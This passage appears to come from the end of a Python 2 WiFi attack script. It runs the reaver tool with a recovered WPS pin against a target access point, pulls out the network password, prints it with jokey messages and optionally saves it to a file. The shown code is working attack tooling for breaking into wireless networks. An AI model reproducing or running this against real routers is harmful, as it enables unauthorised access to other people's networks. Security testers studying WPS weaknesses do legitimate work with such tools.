    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',BSSID,'-c',channel,'-p',pin,'-L'], timeout = (REAVER_TIME))
    password = engine.parse_reaver(output, pin_found = True)
    if password == 'no password':
      print
      print ALERT + "Can't get the password right now because shit happens"
      print "    but you can use the WPS pin to access the wireless network."
      print
    else:
      print INFO + "Dada dada dada Afro circus Afro circus Afro pocka dot pocka dot Afro! (Again)"
      print '\t' + INPUT + password.strip()
      print
    if OUTPUT:
      for_file.append('Password: ' + password + '\n'+'-'*40+'\n')
      c.data_file(for_file)

if __name__ == '__main__':
  banner()
  arg_parser()
  try:
    c = Config()
    engine = Engine()
    engine.check()
  except KeyboardInterrupt, EOFError:
    print
    print ALERT + "Interrupted program!"
    print    
    engine.exit_clean()
